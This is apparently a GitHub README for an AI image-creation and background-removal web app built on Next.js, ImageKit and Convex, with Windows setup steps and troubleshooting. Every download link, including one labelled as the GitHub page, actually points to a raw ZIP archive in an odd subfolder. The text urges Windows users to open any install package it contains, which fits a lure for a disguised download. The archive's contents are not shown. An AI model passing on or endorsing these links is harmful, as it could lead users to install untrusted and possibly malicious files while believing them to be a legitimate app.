# 🎨 ai-creator-platform - Create and edit images with ease

[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip)

## 🖥️ What this is

ai-creator-platform is a Windows-friendly web app for creating and editing images with AI tools. It helps you remove backgrounds, adjust images, and manage edits in one place.

It uses Next.js for the app, ImageKit for background removal, and Convex for the backend. You use it in a browser after you set it up on your PC.

## 📥 Download the app

Go to this page to download and run the software:

[https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip)

If the page includes a release file or install package, download it and open it on Windows. If the page shows the source files only, follow the setup steps below to run it on your computer.

## 🧰 What you need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- A stable internet connection
- Google Chrome, Microsoft Edge, or another modern browser
- Enough free space for the app files
- Node.js for running the web app
- A code editor such as Visual Studio Code if you plan to set it up from source

## 🚀 Getting started

### 1. Download the project

Open the GitHub page and choose the option to download the project files.

If you see a green Code button, use it to download the ZIP file.

If you already have Git installed, you can clone the repository instead.

### 2. Extract the files

If you downloaded a ZIP file:

- Find the ZIP file in your Downloads folder
- Right-click the file
- Select Extract All
- Choose a folder you can find later, such as Desktop or Documents

### 3. Open the project folder

After extraction, open the folder named ai-creator-platform.

You should see project files and folders inside it.

### 4. Install Node.js

If Node.js is not on your PC yet:

- Go to the Node.js website
- Download the Windows installer
- Run the installer
- Keep the default options
- Finish the setup

This lets your PC run the app’s tools and start the local web server.

### 5. Open a terminal

On Windows, open PowerShell or Command Prompt:

- Press the Windows key
- Type PowerShell or Command Prompt
- Open the app

Then move into the project folder using the `cd` command.

Example:

```bash
cd Desktop\ai-creator-platform
```

### 6. Install the project files

Run the install command in the terminal:

```bash
npm install
```

This downloads the files the app needs to run.

### 7. Set up environment values

The app may need local settings for Convex and ImageKit.

Look for a file named `.env.local` or an example file such as `.env.example`.

If there is an example file:

- Open it in a text editor
- Copy the values into a new `.env.local` file
- Fill in the required keys from your own service accounts

Common values may include:

- Convex project URL
- ImageKit public key
- ImageKit private key
- ImageKit URL endpoint

Save the file after you add the values.

### 8. Start the app

Run the app with:

```bash
npm run dev
```

When it starts, the terminal will show a local address, such as:

```bash
http://localhost:3000
```

Open that address in your browser.

## ✨ Main features

- AI image creation tools
- Background removal for product and profile images
- Image editing in a simple browser view
- Upload and manage images in one place
- Cloud-backed data handling with Convex
- Fast image processing with ImageKit
- Built for a clean Next.js interface

## 🧭 How to use it

### Create an image

1. Open the app in your browser
2. Sign in if the app asks for it
3. Choose the image creation tool
4. Add your prompt or image inputs
5. Generate the result
6. Save the image to your device

### Remove a background

1. Upload an image
2. Choose the background removal tool
3. Wait for the result to process
4. Review the cutout
5. Download the edited image

### Edit an image

1. Open an image from your library
2. Choose the edit option
3. Change the area you want to update
4. Save the final version

## 🧪 Common setup problems

### The app does not start

Check that Node.js is installed.

Then run:

```bash
node -v
npm -v
```

If either command fails, install Node.js again.

### The browser shows a blank page

Try these steps:

- Refresh the page
- Close and reopen the browser
- Stop the terminal with `Ctrl + C`
- Run `npm run dev` again

### Background removal does not work

Check your ImageKit values in `.env.local`.

Make sure:

- The keys are correct
- The endpoint is set
- The file was saved after edits

### The app cannot reach the backend

Check your Convex setup.

Make sure the backend URL in your environment file matches your Convex project.

## 🔧 Useful project files

You may see these files in the project folder:

- `package.json` — lists the app scripts and tools
- `.env.local` — stores local settings
- `pages` or `app` — holds the app screens
- `components` — holds UI parts
- `convex` — handles backend data
- `public` — stores images and static files

## 🪟 Windows tips

- Use a folder with a short path, like `C:\ai-creator-platform`
- Avoid putting the project inside a synced folder if you run into file issues
- Run the terminal as a normal user unless the setup asks for more access
- Keep the browser open while the app runs in development mode

## 🔒 Privacy and data

The app may send image data to services you connect, such as ImageKit and Convex.

Only use keys and accounts you trust.

If you use your own service setup, keep your private keys out of public GitHub repos.

## 📌 Repository details

- Name: ai-creator-platform
- Type: Next.js web app
- Focus: AI image creation and editing
- Background removal: ImageKit
- Backend: Convex
- Platforms: Windows and modern browsers

## 📎 Link again

[Visit the ai-creator-platform GitHub page](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip)